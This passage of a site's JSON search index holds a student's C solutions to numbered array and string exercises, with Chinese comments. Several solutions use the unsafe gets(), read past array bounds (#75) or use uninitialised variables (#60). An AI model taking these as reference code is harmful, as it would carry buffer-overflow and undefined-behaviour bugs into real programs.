{\n            matrix[i][j] = arr[i][j];\n        }\n    }\n}\n\n/* \u77e9\u9635\u6253\u5370\u51fd\u6570\uff0conly for debug */\nvoid matrix_print(int n, int matrix[n][n])\n{\n    //\u8bf7\u5728\u6b64\u5904\u5f00\u59cb\u4f60\u7684\u4f5c\u7b54//\n    for (int i = 0; i &lt; n; i++)\n    {\n        for (int j = 0; j &lt; n; j++)\n        {\n            printf(\"%d \", matrix[i][j]);\n        }\n        printf(\"\\n\");\n    }\n}\n\nint main() {\n    int n = 3;\n    int matrix[3][3] =\n    {\n        {1,2,3},\n        {4,5,6},\n        {7,8,9}\n    };\n\n    matrix_translate(n, matrix);\n\n    /* \u8f93\u51fa\u77e9\u9635\uff0c\u4f9b\u8c03\u8bd5\u4f7f\u7528, only for debug */\n    matrix_print(n, matrix);\n\n    return 0;\n}\n\n//\u5173\u4e8e\u6b64\u9898\u7684\u4e00\u70b9\u60f3\u6cd5\uff0c\u539f\u672c\u662f\u8003\u8651\u5728\u4e00\u4e2a\u6570\u7ec4\u91cc\u8fdb\u884c\u7f6e\u6362\n//\u4f46\u662f\u5982\u679c\u8ba9\u5faa\u73af\u8fdb\u884c\u5b8c\u6bd5\u53c8\u56de\u5230\u4e86\u6700\u5f00\u59cb\u7684\u6570\u7ec4\uff0c\u8fd9\u91cc\u9700\u8981\u53bb\u8003\u8651\u5faa\u73af\u7684\u7ec8\u6b62\u6761\u4ef6\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#45","title":"45","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint is_symmetric_matrix(int n, int matrix[n][n])\n{\n    int sum = 0;\n    for (int i = 0; i &lt; n; i++)\n    {\n        for (int j = 0; j &lt; n; j++)\n        {\n            if (matrix[i][j] == matrix[j][i])\n            {\n                sum++;\n            }\n        }\n    }\n    if (sum == n * n) { return 1; }\n    else { return 0; }\n}\n\nint main() {\n    const int n = 3;\n    int matrix[3][3] = //\u8fd9\u91cc\u539f\u672c\u7ed9\u7684\u6570\u7ec4\u6709\u95ee\u9898\uff0c\u4e0d\u8981\u7528\u5b57\u6bcd\u5b9a\u4e49\u6570\u7ec4\u7684\u521d\u59cb\u5316\n    {\n        {1,2,3},\n        {2,4,6},\n        {3,6,9}\n    };\n\n    int result = is_symmetric_matrix(n, matrix);\n    printf(\"%d\", result);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#46","title":"46","text":""},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#47","title":"47","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n// \u5c0632\u4f4d\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5341\u8fdb\u5236IP\u5730\u5740\nvoid binaryToDecimalIP(char* binaryIP) {\n    int decimalIP[4];\n    int index = 0;\n\n    for (int i = 0; i &lt; 32; i += 8) {\n        int num = 0;\n        for (int j = 0; j &lt; 8; j++) {\n            num = num * 2 + (binaryIP[i + j] - '0');\n        }\n        decimalIP[index++] = num;\n    }\n\n    printf(\"%d.%d.%d.%d\\n\", decimalIP[0], decimalIP[1], decimalIP[2], decimalIP[3]);\n}\n\nint main() {\n    char binaryIP[33];\n\n    printf(\"\\n\");\n    scanf(\"%s\", binaryIP);\n\n    printf(\"\\n\");\n    binaryToDecimalIP(binaryIP);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#48","title":"48","text":""},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#49","title":"49","text":""},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#50","title":"50","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n#include &lt;string.h&gt;\n\nint main()\n{\n    char a[339];\n    int i, j;\n    gets(a);\n    j = strlen(a) - 1;          //\u5c06\u5b57\u7b26\u4e32\u7684\u957f\u5ea6-1\u4e4b\u540e\u8d4b\u503c\u7ed9j\n\n    for (i = 0; i &lt; j; i++, j--) {   //\u5c06\u5b57\u7b26\u4ece\u4e24\u4fa7\u5f00\u59cb\u9010\u6e10\u5bf9\u6bd4\u662f\u5426\u76f8\u540c\n        if (a[i] != a[j]) {\n            break;  //\u4e0d\u540c\u5219\u8df3\u51fa\u5faa\u73af\n        }\n    }   \n\n    if (a[i] == a[j]) {\n        printf(\"yes\\n\");\n    }\n    else {\n        printf(\"no\\n\");\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#51","title":"51","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    int N;\n    int sum = 0;\n    int count = 0;\n    int arr[339][339];\n    scanf(\"%d\", &amp;N);\n    for (int i = 0; i &lt; N; i++)\n    {\n        for (int j = 0; j &lt; N; j++)\n        {\n            scanf(\"%d\", &amp;arr[i][j]);\n\n        }\n    }\n    for (int i = 0; i &lt; N; i++)\n    {\n        for (int j = 0; j &lt; N; j++)\n        {\n            if (i == j || i + j == N - 1)\n            {\n                sum = sum + arr[i][j];\n                count++;\n            }\n\n        }\n    }\n    printf(\"sum=%d\\n\", sum);\n    printf(\"count=%d\", count - 1);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#52","title":"52","text":"C<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\n#define N 339\n\nint main()\n{\n    int i, j, flag, len1 = 0, k = 0, cnt = 0;//k\u548ccnt\u90fd\u662f\u8ba1\u6570\u7684\n\n    char str1[N];\n    char str2[N];\n    gets(str1);\n    len1 = strlen(str1);\n\n    for (i = 0; i &lt; len1; i++)\n    {\n        if (str1[i] &gt;= 'A' &amp;&amp; str1[i] &lt;= 'Z')\n        {\n            str2[k] = str1[i];\n            k++;\n        }\n    }\n\n    for (i = 0; i &lt; k; i++)\n    {\n        flag = 0;\n        for (j = 0; j &lt; i; j++)\n        {\n            if (str2[i] == str2[j])\n            {\n                flag = 1;\n            }\n        }\n        if (flag == 0)\n        {\n            printf(\"%c\", str2[i]);\n            cnt++;\n        }\n    }\n\n    if (cnt == 0) {\n        printf(\"Not Found\");\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#53","title":"53","text":""},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#54","title":"54","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint who_will_win(int matrix[][2]) {\n    int a1 = matrix[0][0]; // \u7b2c\u4e00\u4f4d\u827a\u4eba\u7684\u89c2\u4f17\u7968\u6570\n    int b1 = matrix[0][1]; // \u7b2c\u4e00\u4f4d\u827a\u4eba\u7684\u8bc4\u59d4\u7968\u6570\n    int a2 = matrix[1][0]; // \u7b2c\u4e8c\u4f4d\u827a\u4eba\u7684\u89c2\u4f17\u7968\u6570\n    int b2 = matrix[1][1]; // \u7b2c\u4e8c\u4f4d\u827a\u4eba\u7684\u8bc4\u59d4\u7968\u6570\n\n    if (a1 &gt; a2 &amp;&amp; b1 &gt;= 1) {\n        return 1; // \u7b2c\u4e00\u4f4d\u827a\u4eba\u80dc\u51fa\n    }\n    else if (a2 &gt; a1 &amp;&amp; b2 &gt;= 1) {\n        return 2; // \u7b2c\u4e8c\u4f4d\u827a\u4eba\u80dc\u51fa\n    }\n    else if (a1 &lt;= a2 &amp;&amp; b1 == 3) {\n        return 1; // \u7b2c\u4e00\u4f4d\u827a\u4eba\u80dc\u51fa\n    }\n    else {\n        return 2; // \u7b2c\u4e8c\u4f4d\u827a\u4eba\u80dc\u51fa\n    }\n}\n\nint main() {\n    int matrix[2][2];\n\n    // \u8f93\u5165\u89c2\u4f17\u548c\u8bc4\u59d4\u7684\u6295\u7968\u6570\n    for (int i = 0; i &lt; 2; i++) {\n        for (int j = 0; j &lt; 2; j++) {\n            scanf(\"%d\", &amp;matrix[i][j]);\n        }\n    }\n\n    int winner = who_will_win(matrix);\n\n    printf(\"%d\\n\", winner);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#55","title":"55","text":""},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#56","title":"56","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main()\n{\n    char arr[339];\n    gets(arr);\n    int n = strlen(arr);\n\n    for (int i = 0; i &lt; n; i++)\n    {\n        if (i == 0)\n        {\n            printf(\"%c\", arr[i] - 32);\n        }\n        if (arr[i] == ' ')\n        {\n            printf(\"%c\", arr[i + 1] - 32);\n        }\n    }\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#57","title":"57","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#define MAX 80\n#define N 5\n\nint main()\n{\n    int i, j, temp[MAX];\n    char word[N][MAX];     //\u4e8c\u7ef4\u6570\u7ec4word\uff0c\u6bcf\u884c\u5b58\u653e\u4e00\u4e2a\u5b57\u7b26\u4e32\n    for (i = 0; i &lt; N; i++) {\n        scanf(\"%s\", word[i]);\n    }\n\n    //\u5192\u6ce1\u6392\u5e8f\n    for (i = 1; i &lt; N; i++)     \n    {\n        for (j = 0; j &lt; N - i; j++)\n            if (strcmp(word[j], word[j + 1]) &gt; 0)\n            {\n                strcpy(temp, word[j]);\n                strcpy(word[j], word[j + 1]);\n                strcpy(word[j + 1], temp);\n            }\n    }\n\n    printf(\"After sorted:\\n\");\n    for (i = 0; i &lt; N; i++) {\n        printf(\"%s\\n\", word[i]);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#58","title":"58","text":""},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#59","title":"59","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main()\n{\n    char arr[100] = {0};\n    int i = 0;\n\n    while (arr[i] != EOF)\n    {\n\n        scanf(\"%c\", &amp;arr[i]);\n        i++;\n    }\n\n    int num = strlen(arr);\n    for (int i = 0; i &lt; num; i++)\n    {\n        if (arr[i] &gt;= 'A' &amp;&amp; arr[i] &lt;= 'Z')\n        {\n            arr[i] += 32;\n            printf(\"%c\", arr[i]);\n        }\n        else if (arr[i] &gt;= 'a' &amp;&amp; arr[i] &lt;= 'z')\n        {\n            arr[i] -= 32;\n            printf(\"%c\", arr[i]);\n        }\n        else\n        {\n            printf(\"%c\", arr[i]);\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#60","title":"60","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int word; int count1; int count2; int flag;\n    char op;\n    op = getchar();\n    while (op != '\\n') {\n        count1++;\n        if (op == ' ') {\n            word = 0;\n            count1 = 0;\n        }\n        else if (word == 0) {\n            word = 1;\n            count2++;\n        }\n        if (count1 == 1) {\n            if (op &gt;= 'A' &amp;&amp; op &lt;= 'Z') {\n                op = op - 'A' + 'a';\n            }\n            if (op &gt;= 'a' &amp;&amp; op &lt;= 'z') {\n                op = op - 'a' + 'A';\n            }\n        }\n        putchar(op);\n        op = getchar();\n    }\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#61","title":"61","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main() \n{\n    char c[200]={};\n    int sum=0,n;\n    gets(c);\n    n=strlen(c);\n    for(int i=0;i&lt;=n;i++)\n    {\n        if(c[i]!=' '&amp;&amp;c[i]!=0)\n        {\n            sum++;\n        }\n       else \n        {\n           if(c[i+1]==' ')\n            {\n              printf(\"%d \",sum);\n              sum=0;\n              i++;\n           }\n           else\n            {\n                printf(\"%d \",sum);\n                 sum=0;\n            }\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#62","title":"62","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main()\n{\n    char str[81]={0};\n    gets(str);\n\n    for(int i=0;i&lt;81;i++)\n    {\n        if(str[i]&gt;='A'&amp;&amp;str[i]&lt;='Z')\n        {\n            str[i]+=25-2*(str[i]-65);\n        }\n    }\n    printf(\"%s\",str);\n    return 0;\n}\n//\u8fd9\u91cc\u7684\u7b97\u6cd5\u662f\u76f4\u63a5\u53bb\u8ba1\u7b97\u8f93\u5165\u7684\u5b57\u7b26\u53bb\u5bf9\u5e94\u7684\u5b57\u7b26\n//\u6bd4\u8f83\u590d\u6742\uff0c\u53ef\u4ee5\u6362\u6210\u4e24\u4e2a\u6570\u7ec4\uff0c\u4e00\u4e2a\u4eceA\u5230Z\uff0c\u4e00\u4e2a\u4eceZ\u5230A\n//\u4e5f\u53ef\u4ee5\u4e00\u4e2a\u6570\u7ec4\u5b58\u50a8\u5b8c\u6570\u636e\u518d\u8f6c\u6362arr[81]={\"ABCDEFGH.....Z\"},\u8f6c\u6362\u65f6arr[i]=aee[26-i];  \n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#63","title":"63","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nvoid my_sort(int a[], int n)\n{\n    int tmp = 0;\n    for (int i = 1; i &lt;= n; i++)\n    {\n        for (int j = 0; j &lt; n - 1; j++)\n        {\n            if (a[j] &gt; a[j + 1])\n            {\n                tmp = a[j];\n                a[j] = a[j + 1];\n                a[j + 1] = tmp;\n            }\n        }\n    }\n\n}\n\nint main()\n{\n    int a[4] = { 5, 1, 7, 6 };\n    int n = 4;\n    my_sort(a, n);\n    int i = 0;\n    for (; i &lt; n; i++)\n    {\n        printf(\"%d, \", a[i]);\n    }\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#64","title":"64","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    float score[20];\n    int n, i;\n    scanf(\"%d\", &amp;n);\n\n    for (i = 0; i &lt; n; i++)\n    {\n        scanf(\"%f\", &amp;score[i]);\n    }\n\n    int max = 0, min = 0;\n    //\u7528\u6570\u7ec4\u4e0b\u6807\u8bb0\u5f55\u6700\u5927\u503c\u548c\u6700\u5c0f\u503c\n    for (i = 0; i &lt; n; i++)\n    {\n        if (score[max] &gt; score[i]) {\n            max = i;\n        }\n        if (score[min] &lt; score[i]) {\n            min = i;\n        }\n    }\n\n    float sum = 0;\n    //\u6ce8\u610f\u6b64\u5904sum\u7684\u7c7b\u578b\u4e3afloat\u578b\n    for (i = 0; i &lt; n; i++)\n    {\n        if (i != max &amp;&amp; i != min) {\n            sum += score[i];\n        }\n        //\u6392\u9664\u6700\u5927\u503c\u6700\u5c0f\u503c\u4e24\u79cd\u60c5\u51b5\u540e\u6c42\u548c\n        //\u5176\u5b9e\u8fd9\u91cc\u5e76\u4e0d\u5b8c\u5584\uff0c\u6ca1\u6709\u8003\u8651\u5230\u6700\u5927\u6570\u6216\u8005\u6700\u5c0f\u6570\u6709\u591a\u4e2a\u60c5\u51b5\uff0c\u53ef\u4ee5\u9009\u62e9\u901a\u8fc7\u8bb0\u6700\u5927\u6570\u548c\u6700\u5c0f\u7684\u4e2a\u6570\u7684\u65b9\u5f0f\u89e3\u51b3\u3002\n    }\n\n    printf(\"%.2f\", sum / (n - 2));\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#65","title":"65","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint compute(int numbers[], int n)\n{\n    int sum = 0;\n    for (int i = 0; i &lt;= n - 1; i++)\n    {\n        if (i % 2 == 1)\n        {\n            sum = sum - numbers[i];\n        }\n        else if (i % 2 == 0)\n        {\n            sum += numbers[i];\n        }\n    }\n\n    return sum;\n}\n\nint main() {\n    int numbers[] = { 1, 2, 3, 4, 5, 6 };\n    int n = 6;\n    int s = compute(numbers, n);\n    printf(\"%d\", s);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#66","title":"66","text":"C<pre><code>#include&lt;stdio.h&gt;\n\nint main()\n{\n    int N, M;\n    int arr1[101] = {0};\n    int arr2[101] = {0};\n\n    scanf(\"%d %d\", &amp;N, &amp;M);\n    for (int i = 0; i &lt; N; i++)\n    {\n        scanf(\"%d\", &amp;arr1[i]);\n    }\n\n    for (int i = 0; i &lt; N; i++)\n    {\n        if (i + M &lt; N)\n        {\n            arr2[i] = arr1[i + M];\n        }\n        else if (i + M &gt;= N)\n        {\n            arr2[i] = arr1[i + M - N];\n        }\n\n    }\n    for (int i = 0; i &lt; N; i++)\n    {\n        printf(\"%d \", arr2[i]);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#67","title":"67","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n\n    int n;\n    int arr[100] = {0};\n    scanf(\"%d\", &amp;n);\n\n    for (int i = 0; i &lt; n; i++)\n    {\n        scanf(\"%d\", &amp;arr[i]);\n\n    }\n\n    for (int j = n - 1; j &gt;= 0; j--)\n    {\n        printf(\"%d \", arr[j]);\n\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#68","title":"68","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint find_max_number(int numbers[], int n)\n{\n    int tmp = -5211314;\n    for (int i = 0; i &lt; n; i++)\n    {\n        if (numbers[i] &gt; tmp)\n        {\n            tmp = numbers[i];\n        }\n    }\n    return tmp;\n}\n\nint main() {\n    int numbers[] = { 2, 8, 10, 1, 9, 10 };\n    int n = 6;\n    int result = find_max_number(numbers, n);\n\n    printf(\"%d\", result);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#69","title":"69","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint sum_divisible_by_3_or_7(int numbers[], int n)\n{\n    int sum = 0;\n\n    for (int i = 0; i &lt; n; i++)\n    {\n        if (numbers[i] % 7 == 0 || numbers[i] % 3 == 0)\n        {\n            sum += numbers[i];\n        }\n    }\n    return sum;\n}\n\nint main() {\n    int numbers[] = { 3, 5, 6, 8, 9, 14, 25 };\n    int n = 7;\n    int s = sum_divisible_by_3_or_7(numbers, n);\n    printf(\"%d\", s);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#70","title":"70","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint sum_odd(int numbers[], int n)\n{\n    int sum = 0;\n\n    for (int i = 0; i &lt; n; i++)\n    {\n        if (numbers[i] % 2 == 1 || numbers[i] % 2 == -1)\n        {\n            sum = sum + numbers[i];\n        }\n\n    }\n    return sum;\n}\n\nint main()\n{\n    int numbers[] = { 8, 7, 4, 3, 70, 5, 6, 101 };\n    int n = 8;\n    int s = sum_odd(numbers, n);\n    printf(\"%d\", s);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#71","title":"71","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint count_plus_or_nega(int numbers[], int n, int plus_or_nega)\n{\n    int zsum = 0, fsum = 0;\n\n    for (int i = 0; i &lt; n; i++)\n    {\n        if (plus_or_nega == 1 &amp;&amp; numbers[i] &gt; 0)\n        {\n            zsum++;\n        }\n        else if (plus_or_nega == 0 &amp;&amp; numbers[i] &lt; 0)\n        {\n            fsum++;\n        }\n    }\n\n    if (plus_or_nega == 1) {\n        return zsum; \n    }else if (plus_or_nega == 0) {\n        return fsum;\n    }\n\n    //return 0;\n}\n\nint main() {\n    int numbers[7] = { -8, -9, 2, 5, -1, -4, 0 };\n    int n = 7;\n    int plus_or_nega = 1;\n    int result = count_plus_or_nega(numbers, n, plus_or_nega);\n\n    printf(\"%d\", result);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#72","title":"72","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint count_odd_or_even(int numbers[], int n, int odd_or_even)\n{\n    int num = 0;\n    if (odd_or_even == 1)\n    {\n        for (int i = 0; i &lt; n; i++)\n        {\n            if (numbers[i] % 2 == 1)\n            {\n                num++;\n            }\n        }\n        return num;\n    }\n    else //if(odd_or_even==0)\n    {\n        for (int i = 0; i &lt; n; i++)\n        {\n            if (numbers[i] % 2 == 0)\n            {\n                num++;\n            }\n        }\n        return num;\n    }\n\n}\n\nint main() {\n    int n = 6;\n    int numbers[] = { 0, 0, 0, 0, 0, 0 };\n    int odd_or_even = 1;\n    int result = count_odd_or_even(numbers, n, odd_or_even);\n    printf(\"%d\\n\", result);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#73","title":"73","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nfloat compute(float scores[], int n)\n{\n    float sum = 0.00;\n    for (int i = 0; i &lt; n; i++)\n    {\n        sum += scores[i];\n    }\n    return sum / n;\n\n}\n\nint main() {\n    float scores[] = { 77, 54, 92, 73, 60 };\n    int n = 5;\n    float s = compute(scores, n);\n    printf(\"%f\", s);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#74","title":"74","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    char note[100];\n    int i = 0;\n    int k = 0;\n    char c[10][6] = { {'1',',','.','?','!'},{'2','A','B','C'},{'3','D','E','F'},{'4','G','H','I'},{'5','J','K','L'},{'6','M','N','O'},{'7','P','Q','R','S'},{'8','T','U','V'},{'9','W','X','Y','Z'},{'0',' '} };\n    gets(note);\n    while (note[i] != '\\0')\n    {\n        if (note[i] == ' ')\n        {\n            i = i + 1;\n        }\n        else\n        {\n            while (note[i] == note[i + 1])\n            {\n                k = k + 1;\n                i = i + 1;\n            }\n            switch (k)\n            {\n            case 0:printf(\"%c\", c[note[i] - '0' - 1][0]);\n                break;\n            case 1:printf(\"%c\", c[note[i] - '0' - 1][1]);\n                break;\n            case 2:printf(\"%c\", c[note[i] - '0' - 1][2]);\n                break;\n            case 3:printf(\"%c\", c[note[i] - '0' - 1][3]);\n                break;\n            case 4:printf(\"%c\", c[note[i] - '0' - 1][4]);\n                break;\n            }\n            i++;\n            k = 0;\n        }\n    }\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#75","title":"75","text":"C<pre><code>#include &lt;stdio.h&gt;\n\n/* \u51fd\u6570\u58f0\u660e */\nint licky_lottery(int lotterys[6]);\n\nint main() {\n    int resule, lotterys[6] = { 2, 13, 7, 30, 12, 6 };\n    resule = licky_lottery(lotterys);\n    printf(\"%d\", resule);\n    return 0;\n}\n\nint licky_lottery(int lotterys[6])\n{\n    int sum1 = 0, sum2 = 0;\n\n    for (int i = 0; i &lt; 3; i++)\n    {\n        sum1 = sum1 + lotterys[i];\n    }\n\n    for (int i = 3; i &lt; 7; i++)\n    {\n        sum2 = sum2 + lotterys[i];\n    }\n\n    if (sum1 == sum2)\n    {\n        return 1;\n    } else\n    {\n        return 0;\n    }\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#76","title":"76","text":"Text Only<pre><code>#include &lt;stdio.h&gt;\n#define MAX_SIZE 1000\n\nint main() {\n    int i, j;\n    int sum;\n    int factors[MAX_SIZE] = { 0 }; // \u7528\u4e8e\u5b58\u50a8\u56e0\u5b50\u7684\u6570\u7ec4\n\n    for (i = 2; i &lt;= MAX_SIZE; i++) {\n        sum = 1; // \u521d\u59cb\u5316\u56e0\u5b50\u4e4b\u548c\u4e3a1\n        int factor_count = 0; // \u56e0\u5b50\u6570\u91cf\n\n        // \u627e\u51fa\u56e0\u5b50\u5e76\u8ba1\u7b97\u56e0\u5b50\u4e4b\u548c\n        for (j = 2; j &lt;= i / 2; j++) {\n            if (i % j == 0) {\n                factors[factor_count++] = j; // \u5c06\u56e0\u5b50\u5b58\u5165\u6570\u7ec4\n                sum += j;\n            }\n        }\n\n        // \u5224\u65ad\u662f\u5426\u662f\u5b8c\u6570\u5e76\u8f93\u51fa\u7ed3\u679c\n        if (sum == i) {\n            printf(\"%d\u7684\u56e0\u5b50\u662f\uff1a1 \", i);\n            for (j = 0; j &lt; factor_count; j++) {\n                printf(\"%d \", factors[j]);\n            }\n            printf(\"\\n\");\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#77","title":"77","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    int sum0 = 0, sum1 = 0, sum2 = 0, sum3 = 0, sum4 = 0;\n\n    while (1)\n    {\n        int a;\n\n        scanf(\"%d\", &amp;a);\n        if (a &lt; 0) { break; }\n        else\n        {\n            if (a == 0) { sum0++; }\n            else if (a == 1) { sum1++; }\n            else if (a == 2) { sum2++; }\n            else if (a == 3) { sum3++; }\n            else if (a == 4) { sum4++; }\n        }\n    }\n    printf(\"0\uff1a%d\\n\", sum0);\n    printf(\"1\uff1a%d\\n\", sum1);\n    printf(\"2\uff1a%d\\n\", sum2);\n    printf(\"3\uff1a%d\\n\", sum3);\n    printf(\"4\uff1a%d\\n\", sum4);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#78","title":"78","text":"C<pre><code>#include &lt;stdio.h&gt;\n\n/* \u51fd\u6570\u58f0\u660e */\nint linear_searching(int size, int array[], int target);\n\nint main() {\n    int index;\n    int size = 4, array[] = { 1, 2, 3, 4 }, target = 2;\n    index = linear_searching(size, array, target);\n    printf(\"%d\", index);\n    return 0;\n}\n\nint linear_searching(int size, int array[], int target)\n{\n    for (int i = 0; i &lt; size; i++)\n    {\n        if (array[i] == target)\n        {\n            return i;\n        }\n    }\n    return -1;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#79","title":"79","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int num;\n\n    scanf(\"%d\", &amp;num);\n\n    int array[num][num];\n\n    for (int i = 0; i &lt; num; i++) {\n        for (int j = 0; j &lt; num; j++) {\n            scanf(\"%d\", &amp;array[i][j]);\n        }\n    }\n\n    int diagonal_sum = 0;\n    for (int i = 0; i &lt; num; i++) {\n        diagonal_sum += array[i][i]; // \u4e3b\u5bf9\u89d2\u7ebf\u4e0a\u7684\u5143\u7d20\n        diagonal_sum += array[i][num - 1 - i]; // \u6b21\u5bf9\u89d2\u7ebf\u4e0a\u7684\u5143\u7d20\n    }\n\n    if (num % 2 == 1) { // \u5982\u679c\u7ef4\u6570\u4e3a\u5947\u6570\uff0c\u9700\u8981\u51cf\u53bb\u91cd\u590d\u8ba1\u7b97\u7684\u4e2d\u5fc3\u5143\u7d20\n        diagonal_sum -= array[num / 2][num / 2];\n    }\n\n    printf(\"%d\\n\", diagonal_sum);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#80","title":"80","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    //int tmp=0;\n    int arr[10] = {0};\n    for (int i = 0; i &lt; 10; i++)\n    {\n        scanf(\"%d\", &amp;arr[i]);\n\n    }\n    for (int j = 0; j &lt; 10; j++)\n    {\n        for (int i = 0; i &lt; 9; i++)\n        {\n\n            if (arr[i] &gt; arr[i + 1])\n            {\n\n                int tmp = arr[i];\n                arr[i] = arr[i + 1];\n                arr[i + 1] = tmp;\n            }\n\n        }\n    }\n    for (int i = 0; i &lt; 10; i++)\n    {\n        printf(\"%d \", arr[i]);\n\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#81","title":"81","text":"C<pre><code>#include &lt;stdio.h&gt;\n\ndouble grade_statistics(double grades[10])\n{\n    double sum = 0.000;\n\n    for (int i = 0; i &lt; 10; i++)\n    {\n        sum += grades[i];\n    }\n    return sum / 10.00;\n\n}\n\nint main() {\n    double grade, grades[10] = { 77.7, 79.6, 85.3, 92.4, 89.0, 97.9, 76.8, 100.0, 57.9, 65.8 };\n    grade = grade_statistics(grades);\n    printf(\"%f\", grade);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#82","title":"82","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    int arr[100][100] = {0};\n    for (int i = 0; i &lt; 100; i++)\n    {\n        arr[i][i] = 1;\n        arr[i][0] = 1;\n        if (i &gt; 1)\n        {\n            for (int j = 1; j &lt;= i - 1; j++) {\n                arr[i][j] = arr[i - 1][j - 1] + arr[i - 1][j];\n            }\n        }\n    }\n\n    int number;\n    scanf(\"%d\", &amp;number);\n    for (int i = 0; i &lt; number; i++)\n    {\n        printf(\"%d \", arr[number - 1][i]);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#83","title":"83","text":"Text Only<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\n\nint main()\n{\n    int n;\n    while (scanf(\"%d\", &amp;n) != 